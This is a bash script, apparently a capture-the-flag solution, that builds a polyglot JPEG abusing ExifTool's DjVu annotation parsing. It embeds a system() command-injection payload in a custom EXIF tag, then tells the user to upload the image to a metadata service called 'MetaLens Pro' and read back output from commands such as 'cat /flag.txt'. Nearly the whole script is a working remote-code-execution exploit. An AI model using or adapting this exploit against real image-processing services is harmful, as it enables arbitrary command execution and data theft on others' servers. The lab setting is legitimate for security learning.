#!/bin/bash



# Check dependencies
check_deps() {
    local missing=0
    
    echo -e "${YELLOW}[*] Checking dependencies...${NC}"
    
    for cmd in djvumake bzz exiftool; do
        if command -v $cmd &> /dev/null; then
            echo -e "${GREEN}[+] $cmd found${NC}"
        else
            echo -e "${RED}[-] $cmd not found${NC}"
            missing=1
        fi
    done
    
    if [ $missing -eq 1 ]; then
        echo -e "\n${RED}[!] Install missing dependencies:${NC}"
        echo -e "${YELLOW}sudo apt install djvulibre-bin libimage-exiftool-perl${NC}"
        exit 1
    fi
    echo ""
}

# Create ExifTool config
create_config() {
    echo -e "${YELLOW}[*] Creating ExifTool configuration...${NC}"
    
    cat > configfile << 'EOF'
%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
    },
);
1; #end
EOF
    
    echo -e "${GREEN}[+] Configuration file created${NC}"
}

# Use existing JPEG
create_base_jpeg() {
    echo -e "${YELLOW}[*] Using existing JPEG image...${NC}"
    
    if [ ! -f "BRATCHA.jpg" ]; then
        echo -e "${RED}[-] BRATCHA.jpg not found in current directory${NC}"
        exit 1
    fi
    
    cp BRATCHA.jpg base.jpg
    
    echo -e "${GREEN}[+] Using BRATCHA.jpg as base image${NC}"
}

# Create DjVu payload
create_djvu_payload() {
    local command="$1"
    
    echo -e "${YELLOW}[*] Creating DjVu payload...${NC}"
    echo -e "${BLUE}[*] Command: ${command}${NC}"
    
    # Create payload
    echo "(metadata \"\\c\${system('${command}')}\\\"\")" > payload
    
    # Compress
    bzz payload payload.bzz 2>/dev/null
    
    # Create DjVu
    djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz 2>/dev/null
    
    echo -e "${GREEN}[+] DjVu payload created${NC}"
}

# Embed payload into JPEG
create_polyglot() {
    echo -e "${YELLOW}[*] Embedding DjVu payload into JPEG...${NC}"
    
    exiftool -config configfile '-HasselbladExif<=exploit.djvu' base.jpg -o payload.jpg 2>/dev/null
    
    if [ -f "payload.jpg" ]; then
        echo -e "${GREEN}[+] Polyglot JPEG created: payload.jpg${NC}"
        
        local size=$(du -h payload.jpg | cut -f1)
        echo -e "${GREEN}[+] File size: ${size}${NC}"
        echo -e "${GREEN}[+] File type: $(file -b payload.jpg)${NC}"
    else
        echo -e "${RED}[-] Failed to create polyglot${NC}"
        exit 1
    fi
}

# Cleanup
cleanup() {
    rm -f payload payload.bzz exploit.djvu base.jpg configfile base.jpg_original 2>/dev/null
    echo -e "${GREEN}[+] Cleaned up temporary files${NC}"
}

# Main
main() {
    local command="${1:-id}"
    
    check_deps
    create_config
    create_base_jpeg
    create_djvu_payload "$command"
    create_polyglot
    cleanup
    
    echo -e "\n${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                    SUCCESS!                                ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}\n"
    
    echo -e "${BLUE}Next steps:${NC}"
    echo -e "  1. Upload ${YELLOW}payload.jpg${NC} to MetaLens Pro"
    echo -e "  2. Check metadata response for command output"
    echo -e "  3. Look in HasselbladExif or error fields\n"
    
    echo -e "${YELLOW}[*] Try different commands:${NC}"
    echo "  $0 'cat /flag.txt'"
    echo "  $0 'ls -la /'"
    echo "  $0 'find / -name \"*flag*\" 2>/dev/null | head -5'"
    echo "  $0 'env | grep -i flag'"
    echo ""
}

# Usage
if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
    echo "Usage: $0 [COMMAND]"
    echo ""
    echo "Examples:"
    echo "  $0"
    echo "  $0 'cat /flag.txt'"
    echo "  $0 'ls -la /'"
    echo ""
    exit 0
fi

main "$@"
